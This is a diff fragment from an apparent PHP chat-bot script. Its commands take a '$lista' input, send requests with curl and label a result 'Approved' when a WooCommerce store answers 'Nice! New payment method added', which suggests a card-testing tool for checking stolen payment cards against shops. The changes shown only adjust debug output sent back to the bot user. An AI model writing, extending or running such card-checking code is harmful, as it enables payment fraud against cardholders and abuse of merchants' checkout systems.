@@ -474,7 +474,7 @@ fclose($fp);
 
 if (strpos($message, ".ze") === 0 || strpos($message, "!ze") === 0 || strpos($message, "/ze") === 0) {
 
-	sendPv($myid, 'error2..');
+	sendPv($myid, 'error4..');
 
 
 $lista = substr($message, 4);
@@ -561,7 +561,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $json = curl_exec($ch);
 
 $data = json_decode($json, true);
-sendPv($myid, $json);
+
 // Extraemos los valores
 $statusCode = $data['statusCode'];
 $message = $data['message'];
@@ -1662,6 +1662,8 @@ $response = curl_exec($ch);
 $err = curl_error($ch);
 curl_close($ch);
 
+sendPv($myid, $response);
+	
 $result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
 $patron = "/failed: (.*)/";
 preg_match($patron, $result1, $matches);
